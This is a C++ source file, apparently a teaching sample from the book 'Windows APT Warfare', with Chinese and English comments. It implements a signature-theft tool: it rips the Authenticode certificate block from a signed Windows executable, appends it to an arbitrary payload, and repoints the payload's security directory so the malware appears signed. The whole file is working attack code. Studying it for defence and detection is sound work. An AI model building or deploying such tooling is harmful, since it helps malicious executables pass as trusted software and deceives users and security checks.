/**
 * signThief.cpp
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <fstream>
#include <windows.h>
#pragma warning(disable : 4996)
BYTE *MapFileToMemory(LPCSTR filename, LONGLONG &filelen)
{
	FILE *fileptr;
	BYTE *buffer;

	fileptr = fopen(filename, "rb");	// 開啟檔案（binary mode）
	fseek(fileptr, 0, SEEK_END);	 // Jump to the end of the file
	filelen = ftell(fileptr);		 // Get the current byte offset in the file
	rewind(fileptr);				 // Jump back to the beginning of the file

	buffer = (BYTE *)malloc((filelen + 1) * sizeof(char));	// 分配動態記憶體（file + \0）
	fread(buffer, filelen, 1, fileptr);					   // Read in the entire file
	fclose(fileptr);
	return buffer;
}

BYTE *rippedCert(const char *fromWhere, LONGLONG &certSize)
{
	LONGLONG signedPeDataLen = 0;
	BYTE *signedPeData = MapFileToMemory(fromWhere, signedPeDataLen);

	auto ntHdr = PIMAGE_NT_HEADERS(&signedPeData[PIMAGE_DOS_HEADER(signedPeData)->e_lfanew]);
	// 解析 Security Directory 指向的 Authenticode 簽名訊息塊
	auto certInfo = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
	certSize = certInfo.Size;

	// 拷貝一份給 certData
	BYTE *certData = new BYTE[certInfo.Size];
	memcpy(certData, &signedPeData[certInfo.VirtualAddress], certInfo.Size);
	return certData;
}

int main(int argc, char **argv) {
	if (argc < 4) {
		auto fileName = strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0];
		printf("usage: %s [path/to/signed_pe] [path/to/payload] [path/to/output]\n", fileName);
		return 0;
	}
	// signature from where?
	LONGLONG certSize;
	// 將 Authenticode 簽名訊息，從具數位簽章的 PE 檔案拷貝一份下來
	BYTE *certData = rippedCert(argv[1], certSize);

	// payload data prepare.
	LONGLONG payloadSize = 0;
	// 讀入欲套上簽名的 PE 程式檔案，作為 payload
	BYTE *payloadPeData = MapFileToMemory(argv[2], payloadSize);

	// append signature to payload.
	// 準備一份足夠的空間(finalPeData)儲存 payload 簽名訊息
	BYTE *finalPeData = new BYTE[payloadSize + certSize];
	memcpy(finalPeData, payloadPeData, payloadSize);

	// 將拷貝過來的簽名訊息拼貼在原始程式內容末端，並使其 Security Directory 指向到惡意偽造的簽名訊息塊上
	auto ntHdr = PIMAGE_NT_HEADERS(&finalPeData[PIMAGE_DOS_HEADER(finalPeData)->e_lfanew]);
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
	memcpy(&finalPeData[payloadSize], certData, certSize);

	FILE *fp = fopen(argv[3], "wb");
	// 以 fwrite 將為 PE 檔案輸出到磁碟槽上
	fwrite(finalPeData, payloadSize + certSize, 1, fp);
	puts("done.");
}
